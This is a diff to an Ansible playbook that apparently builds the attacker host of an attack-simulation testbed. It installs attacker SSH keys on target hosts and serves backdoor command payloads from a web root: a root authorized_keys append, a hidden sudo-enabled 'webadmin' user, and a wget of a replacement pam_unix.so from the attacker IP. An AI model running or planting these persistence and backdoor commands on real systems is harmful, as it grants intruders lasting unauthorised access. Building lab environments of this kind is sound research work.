@@ -22,7 +22,7 @@
   vars:
     attacker_user: aecid
     attacker_ip: 192.42.1.174
-    delay_before_attack: 3
+    delay_before_attack: 600
   tasks:
     - name: get user home directory
       ansible.builtin.shell: >
@@ -64,6 +64,69 @@
         - attackmate
         - playbooks
 
+# this is the key needed for scenario c_a when mgmt is used as jump host
+    - name: Generate SSH key pair for attacker to access mgmt
+      ansible.builtin.openssh_keypair:
+        path: "{{ user_home.stdout }}/.ssh/attacker_mgmt"
+        type: rsa
+        size: 4096
+        owner: "{{ attacker_user }}"
+        group: "{{ attacker_user }}"
+        mode: '0600'
+      tags:
+        - ssh
+        - playbooks
+
+    - name: Read SSH public key from attacker
+      become: yes
+      ansible.builtin.slurp:
+        src: "{{ user_home.stdout }}/.ssh/attacker_mgmt.pub"
+      register: ssh_key_mgmt
+      tags:
+        - ssh
+        - playbooks
+    
+    - name: Add public key to mgmt's authorized_keys
+      become: yes
+      ansible.builtin.authorized_key:
+        user: aecid
+        state: present
+        key: "{{ ssh_key_mgmt.content | b64decode }}"
+      delegate_to: mgmt
+      tags:
+        - ssh
+        - playbooks
+
+    - name: Set attacker_mgmt_public_key as a fact
+      ansible.builtin.set_fact:
+        attacker_mgmt_public_key: "{{ ssh_key_mgmt.content | b64decode }}"
+      tags:
+        - ssh
+        - playbooks
+
+- name: add ssh key to adminpc1
+  hosts: adminpc1
+  become: true
+  tasks:
+    - name: Add public key to adminpcs's authorized_keys
+      become: yes
+      ansible.builtin.authorized_key:
+        user: aecid
+        state: present
+        key: "{{ hostvars['192.42.1.174']['attacker_mgmt_public_key'] }}"
+      tags:
+        - ssh
+        - playbooks
+
+- name: Install Attacker Host Part 2
+  hosts: attacker
+  become: true
+  vars:
+    attacker_user: aecid
+    attacker_ip: 192.42.1.174
+    delay_before_attack: 600
+  tasks:
+# this is the key used in the backdoors
     - name: create private ssh key for attacker
       community.crypto.openssh_keypair:
           path: "{{user_home.stdout}}/.ssh/attacker_key"
@@ -88,7 +151,7 @@
     - name: Create file with add-key-to-root-authorize-command for pipe
       ansible.builtin.copy:
               content: |
-                "echo \"{{sshkey.public_key}}\" >> /root/.ssh/authorized_keys"
+                echo "{{sshkey.public_key}}" >> /root/.ssh/authorized_keys
               dest: "/var/www/html/README.txt.1"
               owner: "root"
               mode: "0755"
@@ -109,7 +172,7 @@
     - name: Create file for creating a backdoor user(alternate)
       ansible.builtin.copy:
               content: |
-                "/usr/sbin/useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo {{sshkey.public_key}} >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin"
+                /usr/sbin/useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo '{{sshkey.public_key}}' >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin
               dest: "/var/www/html/README.txt.3"
               owner: "root"
               mode: "0755"
@@ -129,7 +192,7 @@
     - name: Create file for a libpam backdoor(alternate)
       ansible.builtin.copy:
               content: |
-                      "wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so"
+                      wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
               dest: "/var/www/html/README.txt.5"
               owner: "root"
               mode: "0755"
@@ -394,4 +457,3 @@
          - metasploit
          - attackmate
          - exploit
-
